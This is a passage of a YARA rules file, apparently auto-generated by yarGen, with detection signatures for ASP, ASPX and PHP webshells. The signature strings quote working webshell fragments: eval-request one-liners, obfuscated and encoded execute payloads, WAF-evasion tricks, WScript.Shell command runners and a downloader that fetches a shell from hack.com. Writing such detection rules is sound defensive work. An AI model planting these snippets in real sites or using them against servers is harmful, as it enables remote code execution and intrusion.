      $s19 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Disposition:\"), vbTextCompare)" fullword ascii
      $s20 = "path=addslash(targetPath) & name" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      8 of them
}

rule vbencode_bypass {
   meta:
      description = "webshell - file vbencode-bypass.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8f23f05d5f97707f4e3e4d90175a099fb924b07c9ed7b81e3a1b8d4bc1c471df"
   strings:
      $s1 = "<%@ LANGUAGE = \"VBScript.Encode\"%>" fullword ascii
      $s2 = "[MM+Xrb+AsAAA==^#~@%>" fullword ascii
      $s3 = "MVK4msPM+5E" fullword ascii
      $s4 = "<%#@~^IQAAAA==3X+^!Y" fullword ascii
      $s5 = "/OcrSl" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_asp_404 {
   meta:
      description = "webshell - file 404.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e4d3d57f4de0497d24095cbd83d5500268323e247e4de2e69cd704975b134678"
   strings:
      $s1 = "Htp=\"http://www.api.com.de/Hack/Hack.html/\"'" fullword ascii
      $s2 = "<%@ LANGUAGE = VBScript.Encode %><% Response.Buffer=True:Server.ScriptTimeout=999999999'" fullword ascii
      $s3 = "YOdr.+lFy2Xid1DKVV(lMR0mmnO1WsGM)ayf 2 &pd^DKV^4CDRCMDGh ^W^W.l[&%f02,I/1.KVs(lMOtbo4skTtOO1WsGM)a20&R&%pd^DKV^4CDRf9Vro4OO1WsGM" ascii
      $s4 = "rsDnDPBtYmnD.WhVCxb:.nDP:b9" fullword ascii
      $s5 = "VYbP.YkP{PnVOr:X\\Y" fullword ascii
      $s6 = "YOdr.+lFy2Xid1DKVV(lMR0mmnO1WsGM)ayf 2 &pd^DKV^4CDRCMDGh ^W^W.l[&%f02,I/1.KVs(lMOtbo4skTtOO1WsGM)a20&R&%pd^DKV^4CDRf9Vro4OO1WsGM" ascii
      $s7 = ",WScript" fullword ascii
      $s8 = "Vrscn7k.GYk+KvN" fullword ascii
      $s9 = "G8wW.sRU;VUYM \\mV;+{?O.]kTpND" fullword ascii
      $s10 = "+4D#,#!@*#" fullword ascii /* hex encoded string 'M' */
      $s11 = "+ nkxWad+M" fullword ascii
      $s12 = "P@* y+y0W['MWVKm,P1}s@!" fullword ascii
      $s13 = ")a[[9idmMG^V8mD /tmNKAO1WsWM):+2 &yfi)R/(`^EM/KDltCU9iNk" fullword ascii
      $s14 = "# v.nN^WwVCk^na?O+V rUs~%" fullword ascii
      $s15 = "Kzwnxy[KWSnDhlO4{-- wr[2lD4LJ@*@!zb0Dm:" fullword ascii
      $s16 = "6kLRb%TxGDzRv%+*ZfzsW^RTxr\"" fullword ascii
      $s17 = "A~S~s=b$Z /KwzsKsN" fullword ascii
      $s18 = "4Yc:DKW /btDBx+LUmt/xK~Y1+snk@!" fullword ascii
      $s19 = "[P=PK8 /WaX:W~K+SG?OlMOOGq3U9O&@#@&:  nKdbYrKx,'PZP=~KyRPXa+~x, @#@&P cZtm.d+DP{JL4+f8 E@#@&jsjPx~: R]nmNP+XO@#@&PyR;VWk+@#@&k6P" ascii
      $s20 = "RXq1YWc^WszNmOCz!w^WCNd&y!q&Z0 FzqfJ* q^2c1,W*1F{cob0JrPSrNDtxJr 01rJP4nkTtY{EE&y!rJ@*@!&C@*@![k7~/DXsn{Bhr[DtlvZTa6Ial9Nk" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      8 of them
}

rule Asp {
   meta:
      description = "webshell - file Asp.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "98524084edfac5bc95205780cd611e5c8bcdd03d9c8fc9df30539058f3c5cb58"
   strings:
      $s1 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword ascii
      $s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword ascii
   condition:
      uint16(0) == 0x8fe5 and filesize < 1KB and
      all of them
}

rule webshell_asp_base {
   meta:
      description = "webshell - file base.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "44a6c760d178e1f06af96f1fbb137e6528911b4964b151884e7b23a6173dddd4"
   strings:
      $s1 = "<%Execute(DeAsc(\"%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59\")):Function DeAsc(Str):Str=Split(" ascii
      $s2 = "<%Execute(DeAsc(\"%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59\")):Function DeAsc(Str):Str=Split(" ascii
      $s3 = "r,\"%\"):For I=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-18):Next:End Function%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_asp_shell {
   meta:
      description = "webshell - file shell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4151e768c99b9a46a0dd81346c4700ee50c7240e7787bf49082af7a2eedca06c"
   strings:
      $s1 = "content=Request.BinaryRead(size)" fullword ascii
      $s2 = "execute(result)" fullword ascii
      $s3 = "result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))" fullword ascii
      $s4 = "Session(\"k\")=k" fullword ascii
      $s5 = "Response.CharSet = \"UTF-8\" " fullword ascii
      $s6 = "k=Session(\"k\")" fullword ascii
      $s7 = "size=Request.TotalBytes" fullword ascii
      $s8 = "For i=1 To size" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_asp_up {
   meta:
      description = "webshell - file up.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "569f8ad1a9afc9653c718bb799b1534134e092241b6e97e54b2804fd29011b3a"
   strings:
      $s1 = "<br>Target PATH:<br><INPUT TYPE=\"text\" Name=\"path\" Value=\"C:\\\">" fullword ascii
      $s2 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
      $s3 = "               Pos = InstrB(PosEnd,RequestBin,getByteString(\"Content-Type:\"))" fullword ascii
      $s4 = "               ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword ascii
      $s5 = "Function getString(StringBin)" fullword ascii
      $s6 = "          Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Disposition\"))" fullword ascii
      $s7 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
      $s8 = "up.asp = File upload" fullword ascii
      $s9 = "               'Get content of object" fullword ascii
      $s10 = "               UploadControl.Add \"ContentType\",ContentType" fullword ascii
      $s11 = "               'Get Filename, content-type and content of file" fullword ascii
      $s12 = "Function BuildUpload(RequestBin)" fullword ascii
      $s13 = "<FORM action=\"?ok=1\" method=\"POST\" ENCTYPE=\"multipart/form-data\">" fullword ascii
      $s14 = "Function getByteString(StringStr)" fullword ascii
      $s15 = "          PosFile = InstrB(BoundaryPos,RequestBin,getByteString(\"filename=\"))" fullword ascii
      $s16 = "          Pos = InstrB(Pos,RequestBin,getByteString(\"name=\"))" fullword ascii
      $s17 = "          Set UploadControl = CreateObject(\"Scripting.Dictionary\")" fullword ascii
      $s18 = "          getString = getString & chr(AscB(MidB(StringBin,intCount,1)))" fullword ascii
      $s19 = "          PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(34)))" fullword ascii
      $s20 = "     Do until (boundaryPos=InstrB(RequestBin,boundary & getByteString(\"--\")))" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 10KB and
      8 of them
}

rule webshell_2 {
   meta:
      description = "webshell - file webshell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0a841b7957377458895059e9780f802a2f75b432b0d87a6700098163eddaa276"
   strings:
      $x1 = "http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script" fullword ascii
      $s2 = "    Set objCmdExec = objshell.exec(thecommand)" fullword ascii
      $s3 = "https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp" fullword ascii
      $s4 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
      $s5 = "    getCommandOutput = objCmdExec.StdOut.ReadAll" fullword ascii
      $s6 = "thisDir = getCommandOutput(\"cmd /c\" & szCMD)" fullword ascii
      $s7 = "http://www.w3schools.com/asp/" fullword ascii
      $s8 = "    Dim objShell, objCmdExec" fullword ascii
      $s9 = "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
      $s10 = "Function getCommandOutput(theCommand)" fullword ascii
      $s11 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
      $s12 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s13 = "<FORM action=\"\" method=\"GET\">" fullword ascii
      $s14 = "<input type=\"text\" name=\"cmd\" size=45 value=\"<%= szCMD %>\">" fullword ascii
      $s15 = "ASP Webshell" fullword ascii
      $s16 = "<% szCMD = request(\"cmd\")" fullword ascii
      $s17 = "Referance :- " fullword ascii
      $s18 = "<input type=\"submit\" value=\"Run\">" fullword ascii
      $s19 = "    Set objShell = CreateObject(\"WScript.Shell\")" fullword ascii
      $s20 = "<b>The server's port:</b>" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_list {
   meta:
      description = "webshell - file list.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4b6775baea15cf04adf3ed9991135ba47c48a5bf2ae7f9dabfbf7755f24d1adb"
   strings:
      $s1 = "Response.Write(\"<li><a href=?type=2&file=\" & server.URLencode(item.path) & \">\" & item.Name & \"</a> - \" & item.Size & \" by" ascii
      $s2 = "Response.Write(\"<li><a href=?type=2&file=\" & server.URLencode(item.path) & \">\" & item.Name & \"</a> - \" & item.Size & \" by" ascii
      $s3 = "list.asp = Directory & File View" fullword ascii
      $s4 = "set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s5 = "file=\"c:\\\"" fullword ascii
      $s6 = "<FORM action=\"\" method=\"GET\">" fullword ascii
      $s7 = "by: darkraver" fullword ascii
      $s8 = "set folder = fs.GetFolder(path)" fullword ascii
      $s9 = "Response.Write(\"<pre>--<br>\")" fullword ascii
      $s10 = "    Set oStr = server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s11 = "If tipo=\"2\" then" fullword ascii
      $s12 = "<INPUT TYPE=\"text\" NAME=\"file\" value=\"<%=file%>\">" fullword ascii
      $s13 = "for each item in folder.SubFolders" fullword ascii
      $s14 = "If file=\"\" then" fullword ascii
      $s15 = "modified: 16/12/2005" fullword ascii
      $s16 = "tipo=\"1\"" fullword ascii
      $s17 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword ascii
      $s18 = "<INPUT TYPE=\"submit\" Value=\"Consultar\">" fullword ascii
      $s19 = "for each item in folder.Files" fullword ascii
      $s20 = "If tipo=\"1\" then" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 4KB and
      8 of them
}

rule webshell_asp_01 {
   meta:
      description = "webshell - file 01.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "419852f196eaa5b3d51faafd60fa1fee9a6ac5392da93d99e52b8abf2a5552c1"
   strings:
      $s1 = "<%eval request(\"pass\")%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_asp_1 {
   meta:
      description = "webshell - file 1.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "20ceacaac5215e9a2e5bb82861f1391382fc7cb132c9c57f706b216f5f975b0d"
   strings:
      $s1 = "22222222222222222222222222222222222222222222222222" ascii /* hex encoded string '"""""""""""""""""""""""""' */
      $s2 = "? \"Exif  II* " fullword ascii
      $s3 = "<%eval request(\"pass\")%>" fullword ascii
      $s4 = "#3R?br?" fullword ascii
      $s5 = "Dr1?~q?" fullword ascii
      $s6 = " $.' \",#" fullword ascii
      $s7 = "Nm*;?r" fullword ascii
      $s8 = " ` `  " fullword ascii
      $s9 = "xcE?I?>+?]" fullword ascii
      $s10 = "5(tuhv" fullword ascii
      $s11 = "/RyoQX" fullword ascii
      $s12 = "Yl.!y?" fullword ascii
      $s13 = "!22222222222222222222222222222222222222222222222222" fullword ascii /* Goodware String - occured 5 times */
      $s14 = "(7),01444'9=82<.342" fullword ascii /* Goodware String - occured 5 times */
   condition:
      uint16(0) == 0x3fff and filesize < 400KB and
      8 of them
}

rule bypass_safedog_03 {
   meta:
      description = "webshell - file bypass_safedog_03.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "62bf8d2408f9a2011702415f9f19e026ed0efbd16a01ea12937f368660b0c589"
   strings:
      $s1 = "Execute cd(\"6877656D2B736972786677752B237E232C2A\",\"1314\")" fullword ascii
      $s2 = "6877656D2B736972786677752B237E232C2A" ascii /* hex encoded string 'hwem+sirxfwu+#~#,*' */
      $s3 = "Function cd(ByVal s, ByVal key)" fullword ascii
      $s4 = "Function Writesource(str)" fullword ascii
      $s5 = "            cd = cd & Chr((\"&H\" & c) - p)" fullword ascii
      $s6 = "  Response.write(str)" fullword ascii
      $s7 = "        k = (i + 1) / 2 Mod Len(key) + 1" fullword ascii
      $s8 = "            i = i + 2" fullword ascii
      $s9 = "            cd = cd & Chr(\"&H\" & c & Mid(s, i + 2, 2))" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule class_terminate {
   meta:
      description = "webshell - file class-terminate.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fbc6438df3960d925a5d2d4880ce806ac26a73a063c66e3804ff7de9046b354b"
   strings:
      $s1 = "(request(\"LandGrey\"))" fullword ascii
      $s2 = "Set X = Nothing" fullword ascii
      $s3 = "Set X = New LandGrey" fullword ascii
      $s4 = "  Private Sub class_terminate" fullword ascii
      $s5 = "Class LandGrey" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule class_initialize {
   meta:
      description = "webshell - file class-initialize.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8d7640bff1eef0a194fd9fac25355169433b53f6cc34f3eb382bc47aa448bd19"
   strings:
      $s1 = "(request(\"LandGrey\"))" fullword ascii
      $s2 = "Set X = New LandGrey" fullword ascii
      $s3 = "Class LandGrey" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule glorysday {
   meta:
      description = "webshell - file glorysday.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fcefb1cbd84106980cc28a7e2d7e3290a860cae2442cd7f91faa4b18342de72b"
   strings:
      $s1 = "exECuTe ReqUEst(\"LandGrey\")" fullword ascii
      $s2 = "Set X = New LandGrey" fullword ascii
      $s3 = "><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%>" fullword ascii
      $s4 = "'<%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%" ascii
      $s5 = "'<%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%" ascii
      $s6 = "'<%%><%%><%%><%%><%%><%%><%%><??><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%" ascii
      $s7 = "><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%" ascii
      $s8 = "'<%%><%%><%%><%%><%%><%%><%%><??><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%" ascii
      $s9 = "><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%>" fullword ascii
      $s10 = "'<%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%" ascii
      $s11 = "'<%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%" ascii
      $s12 = "><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%><%%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 3000KB and
      8 of them
}

rule execute_session {
   meta:
      description = "webshell - file execute-session.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c526a60222848f43e3d11b9fceae6cab1e9e414b490f8247ee95bff8a864b61f"
   strings:
      $s1 = "<%if request(\"LandGrey\")<>\"\"then session(\"LandGrey\")=request(\"LandGrey\"):end if:if session(\"LandGrey\")<>\"\" then exec" ascii
      $s2 = "<%if request(\"LandGrey\")<>\"\"then session(\"LandGrey\")=request(\"LandGrey\"):end if:if session(\"LandGrey\")<>\"\" then exec" ascii
      $s3 = "\"LandGrey\")%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule bypass_all {
   meta:
      description = "webshell - file bypass-all.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9a530d7ba19d285db89b60fc19a6eda1f9c3d927b3b5ad120d6cf4c8a88d9beb"
   strings:
      $s1 = "eXecUTe(fun(\"%167%184%163%174%98%180%167%179%183%167%181%182%106%100%142%163%176%166%137%180%167%187%100%107\"))" fullword ascii
      $s2 = "<%<!--\"-->" fullword ascii
      $s3 = "Str = Split(Str,\"%\")" fullword ascii
      $s4 = "Function fun(Str):" fullword ascii
      $s5 = "For x=1 To Ubound(Str)" fullword ascii
      $s6 = "fun=fun&Chr(Str(x)-66)" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_asp_hkmjj {
   meta:
      description = "webshell - file hkmjj.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "542e36ea677e11f29aaf55491e6ebb10d21d9f7c0c4048661bf84ffc48840d70"
   strings:
      $s1 = "execute (decode (codeds) )   " fullword ascii
      $s2 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword ascii
      $s3 = "'response.write(decode(codeds)) " fullword ascii
      $s4 = " /hkmjj.asp?xx=x ," fullword ascii
      $s5 = "Function DeCode (Coded)   " fullword ascii
      $s6 = "End Function  " fullword ascii
      $s7 = "        Curchar = Mid (Coded, i, 1)   " fullword ascii
      $s8 = "    For i = 1 To Len (Coded)   " fullword ascii
      $s9 = " hkmjj" fullword ascii
      $s10 = "            Curchar = chr (Asc (Curchar) -3)   " fullword ascii
      $s11 = "    On Error Resume Next  " fullword ascii
      $s12 = "        DeCode = Decode&Curchar   " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      8 of them
}

rule webshell_asp_tie01 {
   meta:
      description = "webshell - file tie01.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3d579442aa2f6e66691c03da5b240782ad092cd0b86f025546021c35fa66d207"
   strings:
      $s1 = "<%execute(unescape(\"eval%20request%28%22aaa%22%29\"))%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule utf7_bypass {
   meta:
      description = "webshell - file utf7-bypass.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "96ce222a750689264767355fd7791315de77e551513cfc3f3d3c54bda926d700"
   strings:
      $s1 = "+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgA" ascii /* base64 encoded string ' r e s p o n s e . c o d e p a g e = 6 5 0 0 1 : e v a l ( r e q u e s t ( " L a n d G r e y " ' */
      $s2 = "<%@codepage=65000%>" fullword ascii
      $s3 = "+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgA" ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule download_ {
   meta:
      description = "webshell - file download .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8e51b21fc79dd9e35be249baa71cffc451328361e907c62c2813c3f7524e3abe"
   strings:
      $s1 = " sGet.SaveToFile \"D:\\website\\jingsheng\\Templates\\heise\\html\\shell.asp\",2  " fullword ascii
      $s2 = " xPost.Open \"GET\",\"http://hack.com/shell.txt\",0" fullword ascii
      $s3 = "Set xPost = createObject(\"Microsoft.XMLHTTP\")" fullword ascii
      $s4 = " Set sGet = createObject(\"ADODB.Stream\")" fullword ascii
      $s5 = " sGet.Type = 1" fullword ascii
      $s6 = " sGet.Open()" fullword ascii
      $s7 = " sGet.Write(xPost.responseBody)" fullword ascii
      $s8 = " sGet.Mode = 3" fullword ascii
      $s9 = " xPost.Send()" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule create_activex_object {
   meta:
      description = "webshell - file create-activex-object.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ea52103d78c7667abd8f45c865b3628aa96afaacc6af74d987dbe413c0ad1819"
   strings:
      $s1 = "LandGrey.eXECuTeStAtEmENt(\"eV\"&CHr(&0141)&\"L\"&Chr(40)&\"rEqU\"&cHr(101)&\"St(\"&chr(34)&\"LandGrey\"&chr(34)&CHR(41)&\")\")" fullword ascii
      $s2 = "LandGrey.AddObject \"s\"&chr(101)&\"ssIon\", sessiOn " fullword ascii
      $s3 = "<%@ language = VBscript %>" fullword ascii
      $s4 = "LandGrey.AddObject \"REsponse\", Response " fullword ascii
      $s5 = "LandGrey.AddObject \"r\"&chr(101)&\"quEst\", requesT " fullword ascii
      $s6 = "LandGrey.AddObject \"serv\"&chr(101)&\"r\", serVer " fullword ascii
      $s7 = "LandGrey.lANguaGE = cHr(86)&\"BsC\"&CHR(114)&chr(105)&\"PT\"" fullword ascii
      $s8 = "<%<!--%^_^%-->" fullword ascii
      $s9 = "SET LandGrey = server.CreateObject(\"mS\"&chr(115)&\"cR\"&chr(105)&\"pTCo\"&Chr(110)&Chr(84)&\"rOL.Sc\"&chr(114)&\"IpTCo\"&Chr(1" ascii
      $s10 = "SET LandGrey = server.CreateObject(\"mS\"&chr(115)&\"cR\"&chr(105)&\"pTCo\"&Chr(110)&Chr(84)&\"rOL.Sc\"&chr(114)&\"IpTCo\"&Chr(1" ascii
      $s11 = "LandGrey.AddObject \"apPlic\"&CHR(97)&\"tIon\", application " fullword ascii
      $s12 = ")&\"rOL.1\") " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      8 of them
}

rule bypass_iisuser_p {
   meta:
      description = "webshell - file bypass-iisuser-p.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "31ea6e085e202e97d79ce006e683f3bdb29e557899a52f6f284e40b86d434fb6"
   strings:
      $s1 = "<%Eval(Request(chr(112))):Set fso=CreateObject(\"Scripting.FileSystemObject\"):Set f=fso.GetFile(Request.ServerVariables(\"PATH_" ascii
      $s2 = "<%Eval(Request(chr(112))):Set fso=CreateObject(\"Scripting.FileSystemObject\"):Set f=fso.GetFile(Request.ServerVariables(\"PATH_" ascii
      $s3 = "NSLATED\")):if  f.attributes <> 39 then:f.attributes = 39:end if%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule webshell_asp_xslt {
   meta:
      description = "webshell - file xslt.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f4773f7394c8e15ed9b03b9abbfc8c8f5295a90389fc96522806e7452c4447d9"
   strings:
      $x1 = "xlst=\"<?xml version='1.0'?><xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msx" ascii
      $s2 = " {var a=new ActiveXObject('wscript.shell'); var exec=a.Exec(x);return exec.StdOut.ReadAll()+exec.StdErr.ReadAll(); }</msxsl:scri" ascii
      $s3 = "xml=\"<?xml version=\"\"1.0\"\"?><root >cmd /c dir</root>\"" fullword ascii
      $s4 = "pt><xsl:template match=\"\"/root\"\"> <xsl:value-of select=\"\"zcg:xml(string(.))\"\"/></xsl:template></xsl:stylesheet>\"" fullword ascii
      $s5 = "schemas-microsoft-com:xslt\"\" xmlns:zcg=\"\"zcgonvh\"\"><msxsl:script language=\"\"JScript\"\" implements-prefix=\"\"zcg\"\"> f" ascii
      $s6 = "xlst=\"<?xml version='1.0'?><xsl:stylesheet version=\"\"1.0\"\" xmlns:xsl=\"\"http://www.w3.org/1999/XSL/Transform\"\" xmlns:msx" ascii
      $s7 = "xsldoc.loadxml(xlst)" fullword ascii
      $s8 = "response.write \"<pre><xmp>\" & xmldoc.TransformNode(xsldoc)& \"</xmp></pre>\"" fullword ascii
      $s9 = "xmldoc.loadxml(xml)" fullword ascii
      $s10 = "set xmldoc= Server.CreateObject(\"MSXML2.DOMDocument\")" fullword ascii
      $s11 = "Set xsldoc = Server.CreateObject(\"MSXML2.DOMDocument\")" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 2KB and
      1 of ($x*) and all of them
}

rule webshell_asp_w01 {
   meta:
      description = "webshell - file w01.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e3588837df0acc50949568aa91c9c2167380eb3696aaa5b052600c27ff491dd1"
   strings:
      $s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\" %>" fullword ascii
      $s2 = "Response.Write(eval(keng,\"unsafe\"));" fullword ascii
      $s3 = "keng = Request.Item[\"hxg\"];" fullword ascii
      $s4 = "var keng " fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _b374k_3_2_2_b374k_3_2_3_0 {
   meta:
      description = "webshell - from files b374k-3.2.2.php, b374k-3.2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash2 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
   strings:
      $x1 = "var Zepto=function(){function G(a){return a==null?String(a):z[A.call(a)]||\"object\"}function H(a){return G(a)==\"function\"}fun" ascii
      $s2 = "$cmd = trim(execute(\"ps -p \".$pid));" fullword ascii
      $s3 = "return (res = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (res[1]) : null;" fullword ascii
      $s4 = "$cmd = execute(\"taskkill /F /PID \".$pid);" fullword ascii
      $s5 = "$buff = execute(\"wget \".$url.\" -O \".$saveas);" fullword ascii
      $s6 = "$buff = execute(\"curl \".$url.\" -o \".$saveas);" fullword ascii
      $s7 = "(d=\"0\"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(var c=0,e=a.length-1,g=h;g;){for(var g=j,f=c;f<e;++f)0" ascii
      $s8 = "$cmd = execute(\"kill -9 \".$pid);" fullword ascii
      $s9 = "$cmd = execute(\"tasklist /FI \\\"PID eq \".$pid.\"\\\"\");" fullword ascii
      $s10 = "$body = preg_replace(\"/<a href=\\\"http:\\/\\/www.zend.com\\/(.*?)<\\/a>/\", \"\", $body);" fullword ascii
